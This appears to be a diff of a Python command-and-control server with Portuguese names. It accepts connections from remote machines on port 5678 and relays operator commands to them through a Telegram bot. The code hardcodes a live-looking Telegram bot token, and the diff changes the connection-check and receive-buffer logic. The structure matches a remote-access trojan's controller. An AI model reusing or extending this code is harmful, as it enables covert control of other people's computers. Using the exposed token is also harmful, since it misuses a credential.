@@ -1,28 +1,12 @@
 import threading, socket, requests, time, json
-from funcoes import *
 SERVER = '0.0.0.0'
 PORT = 5678
 clients = {}
 
 global encerrar
 encerrar = False
-token = "6731238648:AAF0nfYufZRsi9MgkGor1AcCoaxol8jJ9tk"
-strURL = f"https://api.telegram.org/bot{token}/"
-update_id = None
-arquivo_registros = "registros.json"
-registros = carregar_registros(arquivo_registros)
-
 
 def main():
-        
-    def verificar_conexoes(client):
-        global encerrar
-        while not encerrar:
-            time.sleep(5) 
-            try:client.send(b'')
-            except:
-                #clients.pop(client)
-                encerrar = True
 
     def enviandoclient(cliente, comando):
         try:
@@ -58,6 +42,8 @@ def main():
 
         
         def telegrambot():
+            
+            
             def carregar_registros(arquivo_registros):
                 try:
                     arquivo = open(arquivo_registros, "r")
@@ -81,7 +67,7 @@ def main():
                     link_requisicao = f"{link_requisicao}&offset={update_id + 1}"
                 resultado = requests.get(link_requisicao)
                 return json.loads(resultado.content)
-
+            
             token = "6731238648:AAF0nfYufZRsi9MgkGor1AcCoaxol8jJ9tk"
             strURL = f"https://api.telegram.org/bot{token}/"
             update_id = None
@@ -109,7 +95,7 @@ def main():
                                     def recebclient(client):
                                         while True:
                                             try:
-                                                msg = client.recv(512).decode('utf8')
+                                                msg = client.recv(2048).decode('utf8')
                                                 return msg
                                             except:
                                                 return 'erro ao tentar receber informações da Maquina'
@@ -139,16 +125,16 @@ def main():
         print(f"\nConexão de: {addr}\n")
         infomsg = infos(client)
         clients[infomsg[3]] = client
+
+
         for key, value in clients.items():
                 print(f'{key}: {value}')
 
         telegram = threading.Thread(target=telegrambot, args=[], daemon=True)
-        conexoes = threading.Thread(target=verificar_conexoes, args=[client], daemon=True)
-
         telegram.start()
-        conexoes.start()
         
         
+
 def tratandomensagem(comando):
     
     comando = comando.split()
